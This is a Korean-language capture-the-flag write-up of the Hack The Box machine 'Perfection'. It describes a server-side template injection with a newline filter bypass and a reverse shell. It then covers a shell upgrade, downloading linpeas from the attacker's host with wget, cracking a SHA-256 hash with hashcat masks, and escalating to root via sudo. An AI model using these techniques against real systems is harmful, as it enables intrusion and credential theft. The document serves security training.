# hack the box: perfection
## 사용된 취약점
## SSTI
- SSTI(Server Side Template Injection)취약점: 웹 어플리케이션에 적용되어 있는 웹 템플릿 엔진(Web Template Engine)에 공격자의 공격 코드가 템플릿에 포함된 상태에서 서버 측에서 템플릿 인젝션이 발현되는 공격을 의미

- category1=1&grade=50&weight=1…
    - SSTI에 취약함
- burpsuite로 테스트를 진행한다.
    - 입력 값을 넣는 곳에 %0A를 넣고 \` \` 안에 스크립트를 삽입한 후 스크립트 전체를 url인코딩하여 실행한다.
        - %0A=\n(개행문자)
        - 개행 문자를 넣은 이유는 스크립트를 그냥 삽입할 경우 malicious code detected 경고가 나와 필터링을 하고 있는 것을 알아차릴 수 있기 때문에 우회 목적으로 넣음
- 반복적인 코드를 템플릿 문서로 만드는 구조로 되어 있다.
- ${7*7}을 넣어 49가 나오는 것으로 보아 server side에서 script가 실행되는 것을 알 수 있다.
    - hacktricks에서 해당 문서를 참조
    - 언어, 프레임워크마다 명령어 종류가 다양함
- reverseshell generator를 이용하여 코드를 생성
    - burpsuite에 넣고 url encoding을 하여 reverse shell을 얻을 수 있다.
    - category1=Maths%0A` <스크립트 삽입>`

- which 로 프로그램 경로 찾을 수 있음
- python3 -c ‘import pty;pty.spawn(”/bin/bash”)’를 한다.
    - pseudo-terminal interface를 import함
    - 그 후 bash shell을 실행
        - 그 이유
        - 완전한 대화형 셸로 업그레이드 하려는 목적
        - 여러 편의성을 위해서 시도
        - 만약 완전한 상호 작용 기능을 제공할 경우 필요 없음
- user.txt의 플래그 값을 찾을 수 있다.

- sqlite3 pupilpath_credentials.db로 db파일을 읽어 susan의 해시 값을 읽을 수 있다.
    - 전 단계에서 susan이 sudo 그룹에 속한 것 때문에 susan의 해시 값을 크랙한다.
    - 만약 그룹에 속하지 않았다면 다른 사용자를 크랙해야 한다.

- hashcat susan.txt /usr/share/wordlists/rockyou.txt
- 크랙은 되지 않았지만 해시 값의 종류를 sha-256으로 좁힐 수 있다.
- hashcat -m 1400 susan.txt /usr/share/wordlists/rockyou.txt 로 시도
    - -m 1400 :sha-256으로 지정
- linpeas.sh를 실행
    - kali에서 python3 -m http.server 4444로 서버 오픈
    - server 터미널에서 wget http://10.10.14.44:4444/linpeas.sh로 다운로드 시킨다.
    - chmod +x linpeas.sh로 하여 실행
- linpeas 결과 중 mail결과에서 pw format을 찾을 수 있다.
    - {firstname_firstname}_{reversed_random}_{integer between1 and 1billion}
    -                                             1000000000(9자리 수)
        
- hashcat -m 1400 -a 3 susan.txt susan_nasus_?d?d?d?d?d?d?d?d?d
    - -a 3: brute force mode
    - ?d : 9자리수 무작위 숫자 지정
- hashcat -m 1400 -a 3 susan.txt susan_nasus_?d?d?d?d?d?d?d?d?d —show로 결과 값 확인
- sudo bash로 크랙 된 pw를 삽입 후 whoami로 root권환을 획득할 수 있다.
## 결론
## SSTI를 이용해서 침투를 수행하고 db파일의 해시값을 통해 크랙하여 pw를 얻을 수 있었다.
## 입력값을 검증하지 않고 명령어를 넣어 실행되는 것을 알 수 있었기에 이를 막아야 보안상의 허점이 줄어든다.

# 보충

- [linpeas.sh](http://linpeas.sh) 기능?
    - linux, macOS에서 권한 상승 가능한 리스트를 나타내는 스크립
